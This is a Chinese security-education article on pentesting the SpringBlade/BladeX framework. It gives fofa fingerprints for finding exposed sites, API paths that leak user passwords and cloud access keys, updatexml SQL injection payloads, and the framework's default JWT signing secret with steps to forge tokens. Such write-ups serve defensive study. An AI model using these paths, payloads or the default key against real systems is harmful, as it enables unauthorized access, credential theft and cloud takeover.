#  bladex漏洞思路总结   
原创 zkaq-不许打呼噜  掌控安全EDU   2024-10-06 14:00  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 本文由掌控安全学院 -  不许打呼噜 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
# Springblade框架介绍：  
  
SpringBlade是一个基于Spring Boot和Spring Cloud的微服务架构框架，它是由商业级项目升级优化而来的综合型项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYKDziagJHVM0nTticdVfncOKW8kY1olBXjZkQCuzrColaxOmTKUg3tySw/640?wx_fmt=png&from=appmsg "null")  
# 0x1 前言  
  
最近跟一些大佬学习了blade的漏洞，所以自己总结了一下，在渗透测试过程中，遇到blade框架的时候，该有哪些渗透思路，Springblade是基于spring-boot开发的，接口泄露、sql注入他也存在。  
# 0x2 Spring-blade特征  
## 特征1  
  
看到一把剑没有，这就是它的特征，可以将一个ico图片，下载下来，在fofa、鹰图上搜索，很多资产都是blade的  
  
```
icon_hash="1047841028"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkY0uAGDo6W3oVlKrJ9iaIP2Tlx8ahkQT1dDcekB6h7rZ2zPspn6ETPicbQ/640?wx_fmt=png&from=appmsg "null")  
## 特征2  
  
在页面加载过程中，会出现以下的加载页面，和最下方的https://bladex.vip，此时我们就可以将这个地址放到fofa上去扩大资产  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYiag56AHthBBAKW5LM90ZLT3wibJmLojpHCT8zSkMPXpnQ1hBKJnvJJEQ/640?wx_fmt=png&from=appmsg "null")  
```
body="https://bladex.vip"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkY9mtn1bhm5md8GrickKbtkicLxrAC48NA5b4zbBGaApzibeza4iaDyaicl1A/640?wx_fmt=png&from=appmsg "null")  
## 特征3  
  
在路径中若发现blade，这个字段，也基本可以确定是blade框架  
```
/api/blade-user/info
/api/blade-auth/oauth/captcha
.....
```  
# 0x3 发现资产  
  
额，本来是像找一个可以注册的站，然后通过注册进去，想不到随便翻翻。。。。  
  
直接把账号密码，写在页面中。。。。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYk4qekhZvKOAwCqaB7Vdvb1CzVDWWeSia22Rd5ZEPyxhpMqbOaJbVxzw/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkY2FNKAiaMQFTDWyQAerYWW4kBnzfP5Es5gXvuHlEQebGnxg6N6STL2nw/640?wx_fmt=png&from=appmsg "null")  
  
进来之后，抓取数据包，说明一嘴，在路径中若看到blade-system，这个路径也代表这个站就是blade框架  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkY8HWaQrjc9yc5649bvy4HqjYoIyTw6ZgeQiaQzusFlaMxxLmtczwLuOw/640?wx_fmt=png&from=appmsg "null")  
# 0x4 漏洞案列  
## 4.1 接口泄露  
  
正常情况下，应该是/api/blade-system/，但很明显开发人员将前面的路径改了，这样有些人在使用扫描器批量扫资产的时候，就会错过这样的站点  
```
/oaApi/blade-system/menu/buttons
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYvRicIyGgEqAB9cCPrSX8x4oXgiaiacMic80mxefDvSEccGaXiaU3Ym1b1mw/640?wx_fmt=png&from=appmsg "")  
```
/oaApi/blade-system/user/user-list
```  
  
泄露了大量用户的姓名，密码（也包括管理员的信息）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYSkvyaMRw2ibmHs2SdIR0ib96J2SHIORTT2ah5SsW3uOwNvvlSMvog4ZA/640?wx_fmt=png&from=appmsg "null")  
```
/oaApi/blade-resource/oss/list
```  
  
泄露云服务器的accesskey、secrekey，直接去接管  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYMic0aj2c0YtmtvpcmJoXibumtm5ibbetd7o0rJTrPiaNX87xRys3brvW7w/640?wx_fmt=png&from=appmsg "null")  
  
这里我们使用OSS Browser工具，使用cname进行连接，否者连接不上，登录成功，但里面不存在任何的数据。  
  
下载地址：https://github.com/aliyun/oss-browser  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYYeE1508dqZYYGpM3uTZCpGCvdL6SJsQdxRRcQaAoUbIPYZQRicr3ATA/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYaoQDonTVRHp9oicPhckw6KBcZq6bOXpQuXHWvMWzySn2icJvTM6XaMJA/640?wx_fmt=png&from=appmsg "null")  
  
这里还有很多的泄露信息的接口，就不一一列举了，我将自己收集的bladeapi接口,放到附件里面了，需要的师傅请到社区自取：https://bbs.zkaq.cn/t/31811.html。  
```
/api/blade-system/user/user-list
/api/blade-system/tenant/select
/api/blade-develop/datasource/list
/api/blade-resource/oss/list
/api/blade-develop/datasource/list
/api/blade-system/code/remove
/api/blade-resource/oss/remove
/api/blade-system/dict-biz/remove
/authority/role/add
/system/dict/add
.......
```  
## 4.2 SQL注入  
```
/oaApi/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1
```  
  
e这个不存在这个漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYsIXQuItsbEdng2lP2EcmKMNZXmQBPLC1iaian3JwvpeFgCjZAHU2lEVQ/640?wx_fmt=png&from=appmsg "null")  
  
试了其他注入点，也不存在注入  
```
/oaApi/blade-user/export-user?Blade-Auth=[jwt码]&account=&realName=&1-updatexml(1,concat(0x5c,database(),0x5c),1)=1

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYTwMZoicmh0b24tYSbKZwkibZlrzhVucfOCmmia3zNNvuhfT8rPrarrVog/640?wx_fmt=png&from=appmsg "null")  
## 4.3 jwt硬编码  
```
bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject

```  
  
漏洞原因：开发者在使用jwt进行身份认证时，并没有对默认的jwt密钥进行修改，导致黑客可以利用默认的jwt密钥去伪造jwt值，可以欺骗服务器获取用户权限等  
  
教程：将上面的密钥放到箭头指示的位置，然后修改payload里的字段，因为服务器都是通过这个payload中的字段进行鉴权的，所以通过修改payload中的字段，来达到伪造jwt欺骗服务器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYrwZ1DP5fYmRxiaicnHxOgKWWpFOsFDrbZz02eZ6U33TmfpV25deI7oicA/640?wx_fmt=png&from=appmsg "null")  
  
将修改后的jwt字段，放回Blade-Auth中，放包，看是否回显，若回显，则证明存在jwt硬编码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkYXcls0s7Luovv9BVMlXqG5g1Xvd9dBic5B6qYwq0e8UGoDpVDGuZ7J8A/640?wx_fmt=png&from=appmsg "null")  
  
不成功则会出现未授权  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcosaO3gFpHoyVib1ueUXIJkY8hcGqraR2J4Ia5Q1oFOcc22sgfh86Z6McPj0ibbOAodoZQnY5vQy57A/640?wx_fmt=png&from=appmsg "null")  
# 0x5 总结  
  
结束，以上是我了解的blade框架的漏洞，暂时就知道这些漏洞，若后续有新发现的漏洞也会补上，谢谢师傅们观看  
```
```  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
